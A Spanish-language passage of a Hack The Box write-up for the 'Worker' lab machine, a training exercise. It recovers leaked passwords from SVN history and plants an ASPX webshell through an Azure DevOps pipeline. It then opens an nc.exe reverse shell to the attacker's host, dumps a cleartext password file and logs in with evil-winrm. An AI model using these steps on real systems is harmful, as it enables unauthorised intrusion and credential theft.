    <p>Bueno tenemos otro puerto abierto el cual es el 3690 que corre el servicio de <code class="language-plaintext highlighter-rouge">svnserve</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server">https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server</a>.</p>
  </li>
  <li>
    <p><a href="https://www.visualsvn.com/server/">https://www.visualsvn.com/server/</a>.</p>
  </li>
  <li>
    <p>En <code class="language-plaintext highlighter-rouge">hacktricks</code> nos dicen como podemos enumerar este servicio.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nc <span class="nt">-vn</span> 10.10.10.203 3690
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.203] 3690 <span class="o">(</span>svn<span class="o">)</span> open
<span class="o">(</span> success <span class="o">(</span> 2 2 <span class="o">(</span> <span class="o">)</span> <span class="o">(</span> edit-pipeline svndiff1 accepts-svndiff2 absent-entries commit-revprops depth log-revprops atomic-revprops partial-replay inherited-props ephemeral-txnprops file-revs-reverse list <span class="o">)</span> <span class="o">)</span> <span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Además nos mencionan uso de esta herramienta.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap svn <span class="nb">help
</span>usage: svn &lt;subcommand&gt; <span class="o">[</span>options] <span class="o">[</span>args]
Subversion command-line client.
Type <span class="s1">'svn help &lt;subcommand&gt;'</span> <span class="k">for </span><span class="nb">help </span>on a specific subcommand.
Type <span class="s1">'svn --version'</span> to see the program version and RA modules,
     <span class="s1">'svn --version --verbose'</span> to see dependency versions as well,
     <span class="s1">'svn --version --quiet'</span> to see just the version number.

Most subcommands take file and/or directory arguments, recursing
on the directories.  If no arguments are supplied to such a
<span class="nb">command</span>, it recurses on the current directory <span class="o">(</span>inclusive<span class="o">)</span> by default.

Available subcommands:
   add
   auth
   blame <span class="o">(</span>praise, annotate, ann<span class="o">)</span>
   <span class="nb">cat
   </span>changelist <span class="o">(</span>cl<span class="o">)</span>
   checkout <span class="o">(</span>co<span class="o">)</span>
   cleanup
   commit <span class="o">(</span>ci<span class="o">)</span>
   copy <span class="o">(</span><span class="nb">cp</span><span class="o">)</span>
   delete <span class="o">(</span>del, remove, <span class="nb">rm</span><span class="o">)</span>
   diff <span class="o">(</span>di<span class="o">)</span>
   <span class="nb">export
   help</span> <span class="o">(</span>?, h<span class="o">)</span>
   import
   info
   list <span class="o">(</span><span class="nb">ls</span><span class="o">)</span>
   lock
   log
   merge
   mergeinfo
   <span class="nb">mkdir
   </span>move <span class="o">(</span><span class="nb">mv</span>, rename, ren<span class="o">)</span>
   patch
   propdel <span class="o">(</span>pdel, pd<span class="o">)</span>
   propedit <span class="o">(</span>pedit, pe<span class="o">)</span>
   propget <span class="o">(</span>pget, pg<span class="o">)</span>
   proplist <span class="o">(</span>plist, pl<span class="o">)</span>
   propset <span class="o">(</span>pset, ps<span class="o">)</span>
   relocate
   resolve
   resolved
   revert
   status <span class="o">(</span><span class="nb">stat</span>, st<span class="o">)</span>
   switch <span class="o">(</span>sw<span class="o">)</span>
   unlock
   update <span class="o">(</span>up<span class="o">)</span>
   upgrade

Subversion is a tool <span class="k">for </span>version control.
For additional information, see http://subversion.apache.org/
</code></pre></div></div>

<ul>
  <li>Podemos listar lo que hay.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap svn <span class="nb">ls </span>svn://10.10.10.203
dimension.worker.htb/
moved.txt
</code></pre></div></div>

<ul>
  <li>Tambien nos dicen que podemos descargar el repositorio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap svn checkout svn://10.10.10.203
A    dimension.worker.htb
A    dimension.worker.htb/LICENSE.txt
A    dimension.worker.htb/README.txt
A    dimension.worker.htb/assets
A    dimension.worker.htb/assets/css
A    dimension.worker.htb/assets/css/fontawesome-all.min.css
A    dimension.worker.htb/assets/css/main.css
A    dimension.worker.htb/assets/css/noscript.css
A    dimension.worker.htb/assets/js
A    dimension.worker.htb/assets/js/breakpoints.min.js
A    dimension.worker.htb/assets/js/browser.min.js
A    dimension.worker.htb/assets/js/jquery.min.js
A    dimension.worker.htb/assets/js/main.js
A    dimension.worker.htb/assets/js/util.js
A    dimension.worker.htb/assets/sass
A    dimension.worker.htb/assets/sass/base
A    dimension.worker.htb/assets/sass/base/_page.scss
A    dimension.worker.htb/assets/sass/base/_reset.scss
A    dimension.worker.htb/assets/sass/base/_typography.scss
A    dimension.worker.htb/assets/sass/components
A    dimension.worker.htb/assets/sass/components/_actions.scss
A    dimension.worker.htb/assets/sass/components/_box.scss
A    dimension.worker.htb/assets/sass/components/_button.scss
A    dimension.worker.htb/assets/sass/components/_form.scss
A    dimension.worker.htb/assets/sass/components/_icon.scss
A    dimension.worker.htb/assets/sass/components/_icons.scss
A    dimension.worker.htb/assets/sass/components/_image.scss
A    dimension.worker.htb/assets/sass/components/_list.scss
A    dimension.worker.htb/assets/sass/components/_table.scss
A    dimension.worker.htb/assets/sass/layout
A    dimension.worker.htb/assets/sass/layout/_bg.scss
A    dimension.worker.htb/assets/sass/layout/_footer.scss
A    dimension.worker.htb/assets/sass/layout/_header.scss
A    dimension.worker.htb/assets/sass/layout/_main.scss
A    dimension.worker.htb/assets/sass/layout/_wrapper.scss
A    dimension.worker.htb/assets/sass/libs
A    dimension.worker.htb/assets/sass/libs/_breakpoints.scss
A    dimension.worker.htb/assets/sass/libs/_functions.scss
A    dimension.worker.htb/assets/sass/libs/_mixins.scss
A    dimension.worker.htb/assets/sass/libs/_vars.scss
A    dimension.worker.htb/assets/sass/libs/_vendor.scss
A    dimension.worker.htb/assets/sass/main.scss
A    dimension.worker.htb/assets/sass/noscript.scss
A    dimension.worker.htb/assets/webfonts
A    dimension.worker.htb/assets/webfonts/fa-brands-400.eot
A    dimension.worker.htb/assets/webfonts/fa-brands-400.svg
A    dimension.worker.htb/assets/webfonts/fa-brands-400.ttf
A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff
A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff2
A    dimension.worker.htb/assets/webfonts/fa-regular-400.eot
A    dimension.worker.htb/assets/webfonts/fa-regular-400.svg
A    dimension.worker.htb/assets/webfonts/fa-regular-400.ttf
A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff
A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff2
A    dimension.worker.htb/assets/webfonts/fa-solid-900.eot
A    dimension.worker.htb/assets/webfonts/fa-solid-900.svg
A    dimension.worker.htb/assets/webfonts/fa-solid-900.ttf
A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff
A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff2
A    dimension.worker.htb/images
A    dimension.worker.htb/images/bg.jpg
A    dimension.worker.htb/images/overlay.png
A    dimension.worker.htb/images/pic01.jpg
A    dimension.worker.htb/images/pic02.jpg
A    dimension.worker.htb/images/pic03.jpg
A    dimension.worker.htb/index.html
A    moved.txt
Checked out revision 5.
</code></pre></div></div>

<ul>
  <li>Si vemos lo que dice <code class="language-plaintext highlighter-rouge">moved.txt</code> nos dan un subdominio nos hablan sobre una versión final.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>moved.txt
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregarlos al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para que en caso de que sea alguna pagina web nos pueda resolver.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.10.203 devops.worker.htb dimension.worker.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
</code></pre></div></div>

<ul>
  <li>Nos pide credenciales.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/2.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/3.png" />
</p>

<ul>
  <li>En el otro subdominio solo encontramos esto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/4.png" />
</p>

<ul>
  <li>Esto es todo lo que contiene.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb tree
<span class="nb">.</span>
├── LICENSE.txt
├── README.txt
├── assets
│   ├── css
│   │   ├── fontawesome-all.min.css
│   │   ├── main.css
│   │   └── noscript.css
│   ├── js
│   │   ├── breakpoints.min.js
│   │   ├── browser.min.js
│   │   ├── jquery.min.js
│   │   ├── main.js
│   │   └── util.js
│   ├── sass
│   │   ├── base
│   │   │   ├── _page.scss
│   │   │   ├── _reset.scss
│   │   │   └── _typography.scss
│   │   ├── components
│   │   │   ├── _actions.scss
│   │   │   ├── _box.scss
│   │   │   ├── _button.scss
│   │   │   ├── _form.scss
│   │   │   ├── _icon.scss
│   │   │   ├── _icons.scss
│   │   │   ├── _image.scss
│   │   │   ├── _list.scss
│   │   │   └── _table.scss
│   │   ├── layout
│   │   │   ├── _bg.scss
│   │   │   ├── _footer.scss
│   │   │   ├── _header.scss
│   │   │   ├── _main.scss
│   │   │   └── _wrapper.scss
│   │   ├── libs
│   │   │   ├── _breakpoints.scss
│   │   │   ├── _functions.scss
│   │   │   ├── _mixins.scss
│   │   │   ├── _vars.scss
│   │   │   └── _vendor.scss
│   │   ├── main.scss
│   │   └── noscript.scss
│   └── webfonts
│       ├── fa-brands-400.eot
│       ├── fa-brands-400.svg
│       ├── fa-brands-400.ttf
│       ├── fa-brands-400.woff
│       ├── fa-brands-400.woff2
│       ├── fa-regular-400.eot
│       ├── fa-regular-400.svg
│       ├── fa-regular-400.ttf
│       ├── fa-regular-400.woff
│       ├── fa-regular-400.woff2
│       ├── fa-solid-900.eot
│       ├── fa-solid-900.svg
│       ├── fa-solid-900.ttf
│       ├── fa-solid-900.woff
│       └── fa-solid-900.woff2
├── images
│   ├── bg.jpg
│   ├── overlay.png
│   ├── pic01.jpg
│   ├── pic02.jpg
│   └── pic03.jpg
└── index.html

11 directories, 55 files
</code></pre></div></div>

<ul>
  <li>Aquí podemos ver el <code class="language-plaintext highlighter-rouge">Commit history</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn log svn://10.10.10.203
<span class="nt">------------------------------------------------------------------------</span>
r5 | nathen | 2020-06-20 08:52:00 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line

Added note that repo has been migrated
<span class="nt">------------------------------------------------------------------------</span>
r4 | nathen | 2020-06-20 08:50:20 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line

Moving this repo to our new devops server which will handle the deployment <span class="k">for </span>us
<span class="nt">------------------------------------------------------------------------</span>
r3 | nathen | 2020-06-20 08:46:19 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line

-
<span class="nt">------------------------------------------------------------------------</span>
r2 | nathen | 2020-06-20 08:45:16 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line

Added deployment script
<span class="nt">------------------------------------------------------------------------</span>
r1 | nathen | 2020-06-20 08:43:43 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line

First version
<span class="nt">------------------------------------------------------------------------</span>
</code></pre></div></div>

<ul>
  <li>Este es interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn log <span class="nt">-r</span> 4 svn://10.10.10.203
<span class="nt">------------------------------------------------------------------------</span>
r4 | nathen | 2020-06-20 08:50:20 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line

Moving this repo to our new devops server which will handle the deployment <span class="k">for </span>us
<span class="nt">------------------------------------------------------------------------</span>
</code></pre></div></div>

<ul>
  <li>El archivo <code class="language-plaintext highlighter-rouge">deploy.ps1</code> fue eliminado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn log <span class="nt">-v</span> <span class="nt">-r</span> 4 svn://10.10.10.203
<span class="nt">------------------------------------------------------------------------</span>
r4 | nathen | 2020-06-20 08:50:20 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line
Changed paths:
   D /deploy.ps1

Moving this repo to our new devops server which will handle the deployment <span class="k">for </span>us
<span class="nt">------------------------------------------------------------------------</span>
</code></pre></div></div>

<ul>
  <li>Si revisamos cambios que se realizaron en ese archivo antes de ser eliminado vemos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn diff <span class="nt">-r</span> 2:3 svn://10.10.10.203/deploy.ps1

Index: deploy.ps1
<span class="o">===================================================================</span>
<span class="nt">---</span> deploy.ps1	<span class="o">(</span>revision 2<span class="o">)</span>
+++ deploy.ps1	<span class="o">(</span>revision 3<span class="o">)</span>
@@ <span class="nt">-1</span>,6 +1,7 @@
 <span class="nv">$user</span> <span class="o">=</span> <span class="s2">"nathen"</span>
-<span class="nv">$plain</span> <span class="o">=</span> <span class="s2">"wendel98"</span>
+# NOTE: We cant have my password here!!!
+<span class="nv">$plain</span> <span class="o">=</span> <span class="s2">""</span>
 <span class="nv">$pwd</span> <span class="o">=</span> <span class="o">(</span><span class="nv">$plain</span> | ConvertTo-SecureString<span class="o">)</span>
 <span class="nv">$Credential</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential <span class="nv">$user</span>, <span class="nv">$pwd</span>
 <span class="nv">$args</span> <span class="o">=</span> <span class="s2">"Copy-Site.ps1"</span>
<span class="nt">-Start-Process</span> powershell.exe <span class="nt">-Credential</span> <span class="nv">$Credential</span> <span class="nt">-ArgumentList</span> <span class="o">(</span><span class="s2">"-file </span><span class="nv">$args</span><span class="s2">"</span><span class="o">)</span>
+Start-Process powershell.exe <span class="nt">-Credential</span> <span class="nv">$Credential</span> <span class="nt">-ArgumentList</span> <span class="o">(</span><span class="s2">"-file </span><span class="nv">$args</span><span class="s2">"</span><span class="o">)</span>
<span class="se">\ </span>No newline at end of file
</code></pre></div></div>

<ul>
  <li>Si las probamos en el sitio web vemos que son correctas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/5.png" />
</p>

<h2 id="shell-as-defaultapppool">Shell as defaultapppool</h2>

<ul>
  <li>Vemos varios repositorios al parecer son los subdominios.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/6.png" />
</p>

<ul>
  <li>
    <p>Como tenemos acceso podemos subir un <code class="language-plaintext highlighter-rouge">.aspx</code> para ganar acceso <a href="https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx">https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx</a>.</p>
  </li>
  <li>
    <p>Si lo intentamos subir no nos deja.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/7.png" />
</p>

<ul>
  <li>
    <p>Nos dicen que tenemos que hacer un <code class="language-plaintext highlighter-rouge">Pull Request</code>.</p>
  </li>
  <li>
    <p>Vamos a crear una nueva rama.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/8.png" />
</p>

<ul>
  <li>Si subimos el archivo vemos que ahora si se puede.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/9.png" />
</p>

<ul>
  <li>Vamos a crear un <code class="language-plaintext highlighter-rouge">Pull Request</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/10.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/11.png" />
</p>

<ul>
  <li>Ahora lo aprobamos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/12.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/13.png" />
</p>

<ul>
  <li>Pero no vemos nada.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/14.png" />
</p>

<ul>
  <li>
    <p>Podemos aprovecharnos de los Pipeline <a href="https://learn.microsoft.com/es-es/azure/azure-resource-manager/templates/deployment-tutorial-pipeline">https://learn.microsoft.com/es-es/azure/azure-resource-manager/templates/deployment-tutorial-pipeline</a>.</p>
  </li>
  <li>
    <p>Si le damos en Run vemos que podemos construir una.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/15.png" />
</p>

<ul>
  <li>
    <p>Bueno nos da un error y esto es por que al parecer la otra rama fue eliminada yo creo entonces tenemos que hacerlo rápido lo que vamos hacer es crear todo otra vez y subir el <code class="language-plaintext highlighter-rouge">cmd.aspx</code> hacer los mismos pasos pero ahora con la nueva rama.</p>
  </li>
  <li>
    <p>Y vemos que ya se puede.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/16.png" />
</p>

<ul>
  <li>Bueno ahora solo falta agregar el subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n1</span>
10.10.10.203 devops.worker.htb dimension.worker.htb alpha.worker.htb
</code></pre></div></div>

<ul>
  <li>Y listo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/17.png" />
</p>

<ul>
  <li>
    <p>Ahora vamos a ganar acceso.</p>
  </li>
  <li>
    <p>Vamos a usar el <code class="language-plaintext highlighter-rouge">netcat</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
➜  content python3 <span class="nt">-m</span> http.server 8080
Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Ahora simplemente hacemos una petición con <code class="language-plaintext highlighter-rouge">curl</code> para descargamos el nc.exe y ponerlo en esa ruta del sistema.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/18.png" />
</p>

<ul>
  <li>Ahora ya nos enviamos la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\n</span>c.exe <span class="nt">-e</span> cmd tuip 443
</code></pre></div></div>

<ul>
  <li>Nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.203] 50333
Microsoft Windows <span class="o">[</span>Version 10.0.17763.1282]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;whoami
<span class="nb">whoami
</span>iis apppool<span class="se">\d</span>efaultapppool

c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
</code></pre></div></div>

<h2 id="shell-as-robisl">Shell as robisl</h2>

<ul>
  <li>Aquí vemos unidades logicas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;net share
net share

Share name   Resource                        Remark

<span class="nt">-------------------------------------------------------------------------------</span>
C<span class="nv">$ </span>          C:<span class="se">\ </span>                            Default share
IPC<span class="nv">$ </span>                                        Remote IPC
W<span class="nv">$ </span>          W:<span class="se">\ </span>                            Default share
ADMIN<span class="nv">$ </span>      C:<span class="se">\W</span>indows                      Remote Admin
The <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;w:
w:

W:<span class="se">\&gt;</span><span class="nb">dir
dir
 </span>Volume <span class="k">in </span>drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:<span class="se">\</span>

2020-06-16  18:59    &lt;DIR&gt;          agents
2020-03-28  15:57    &lt;DIR&gt;          AzureDevOpsData
2020-04-03  11:31    &lt;DIR&gt;          sites
2020-06-20  16:04    &lt;DIR&gt;          svnrepos
               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
               4 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free

W:<span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vemos un <code class="language-plaintext highlighter-rouge">passwd</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\&gt;</span><span class="nb">cd </span>svnrepos
<span class="nb">cd </span>svnrepos

W:<span class="se">\s</span>vnrepos&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:<span class="se">\s</span>vnrepos

2020-06-20  16:04    &lt;DIR&gt;          <span class="nb">.</span>
2020-06-20  16:04    &lt;DIR&gt;          ..
2020-06-20  11:29    &lt;DIR&gt;          www
               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
               3 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free

W:<span class="se">\s</span>vnrepos&gt;cd www
<span class="nb">cd </span>www

W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww

2020-06-20  11:29    &lt;DIR&gt;          <span class="nb">.</span>
2020-06-20  11:29    &lt;DIR&gt;          ..
2020-06-20  15:30    &lt;DIR&gt;          conf
2020-06-20  15:52    &lt;DIR&gt;          db
2020-06-20  11:29                 2 format
2020-06-20  11:29    &lt;DIR&gt;          hooks
2020-06-20  11:29    &lt;DIR&gt;          locks
2020-06-20  11:29               251 README.txt
               2 File<span class="o">(</span>s<span class="o">)</span>            253 bytes
               6 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free

W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww&gt;cd conf
<span class="nb">cd </span>conf

W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf

2020-06-20  15:30    &lt;DIR&gt;          <span class="nb">.</span>
2020-06-20  15:30    &lt;DIR&gt;          ..
2020-06-20  11:29             1112 authz
2020-06-20  11:29               904 hooks-env.tmpl
2020-06-20  15:27             1031 passwd
2020-04-04  20:51             4454 svnserve.conf
               4 File<span class="o">(</span>s<span class="o">)</span>          7501 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free

W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;
</code></pre></div></div>

<ul>
  <li>Vemos usuarios y contraseñas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;type passwd
<span class="nb">type </span>passwd
<span class="c">### This file is an example password file for svnserve.</span>
<span class="c">### Its format is similar to that of svnserve.conf. As shown in the</span>
<span class="c">### example below it contains one section labelled [users].</span>
<span class="c">### The name and password for each user follow, one account per line.</span>

<span class="o">[</span><span class="nb">users</span><span class="o">]</span>
nathen <span class="o">=</span> wendel98
nichin <span class="o">=</span> fqerfqerf
nichin <span class="o">=</span> asifhiefh
noahip <span class="o">=</span> player
nuahip <span class="o">=</span> wkjdnw
oakhol <span class="o">=</span> bxwdjhcue
owehol <span class="o">=</span> supersecret
paihol <span class="o">=</span> painfulcode
parhol <span class="o">=</span> gitcommit
pathop <span class="o">=</span> iliketomoveit
pauhor <span class="o">=</span> nowayjose
payhos <span class="o">=</span> icanjive
perhou <span class="o">=</span> elvisisalive
peyhou <span class="o">=</span> ineedvacation
phihou <span class="o">=</span> pokemon
quehub <span class="o">=</span> pickme
quihud <span class="o">=</span> kindasecure
rachul <span class="o">=</span> guesswho
raehun <span class="o">=</span> idontknow
ramhun <span class="o">=</span> thisis
ranhut <span class="o">=</span> getting
rebhyd <span class="o">=</span> rediculous
reeinc <span class="o">=</span> iagree
reeing <span class="o">=</span> tosomepoint
reiing <span class="o">=</span> isthisenough
renipr <span class="o">=</span> dummy
rhiire <span class="o">=</span> <span class="nb">users
</span>riairv <span class="o">=</span> canyou
ricisa <span class="o">=</span> seewhich
robish <span class="o">=</span> onesare
robisl <span class="o">=</span> wolves11
robive <span class="o">=</span> andwhich
ronkay <span class="o">=</span> onesare
rubkei <span class="o">=</span> the
rupkel <span class="o">=</span> sheeps
ryakel <span class="o">=</span> imtired
sabken <span class="o">=</span> drjones
samken <span class="o">=</span> aqua
sapket <span class="o">=</span> hamburger
sarkil <span class="o">=</span> friday

W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;
</code></pre></div></div>

<ul>
  <li>Vemos que el único usuario de interés es <code class="language-plaintext highlighter-rouge">robisl</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;dir C:<span class="se">\U</span>sers<span class="se">\</span>
<span class="nb">dir </span>C:<span class="se">\U</span>sers<span class="se">\</span>
 Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 32D6-9041

 Directory of C:<span class="se">\U</span>sers

2020-07-07  17:53    &lt;DIR&gt;          <span class="nb">.</span>
2020-07-07  17:53    &lt;DIR&gt;          ..
2020-03-28  15:59    &lt;DIR&gt;          .NET v4.5
2020-03-28  15:59    &lt;DIR&gt;          .NET v4.5 Classic
2020-08-18  00:33    &lt;DIR&gt;          Administrator
2020-03-28  15:01    &lt;DIR&gt;          Public
2020-07-22  01:11    &lt;DIR&gt;          restorer
2020-07-08  19:22    &lt;DIR&gt;          robisl
               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
               8 Dir<span class="o">(</span>s<span class="o">)</span>  10459025408 bytes free

W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;
</code></pre></div></div>

<ul>
  <li>El usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;net user robisl
net user robisl
User name                    robisl
Full Name                    Robin Islip
Comment
User<span class="s1">'s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2020-04-05 21:27:26
Password expires             Never
Password changeable          2020-04-05 21:27:26
Password required            No
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2020-08-03 12:41:02

Logon hours allowed          All

Local Group Memberships      *Production           *Remote Management Use
Global Group memberships     *None
The command completed successfully.


W:\svnrepos\www\conf&gt;
</span></code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Ahora ya nos podemos conectar y ver la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.10.10.203 <span class="nt">-u</span> <span class="s1">'robisl'</span> <span class="nt">-p</span> <span class="s1">'wolves11'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>worker<span class="se">\r</span>obisl
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop&gt; <span class="nb">type </span>user.txt
2ce8a9d7ff7736acc3469f7274b2006a
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>No vemos ningún privilegio ni nada interesante.</li>
</ul>

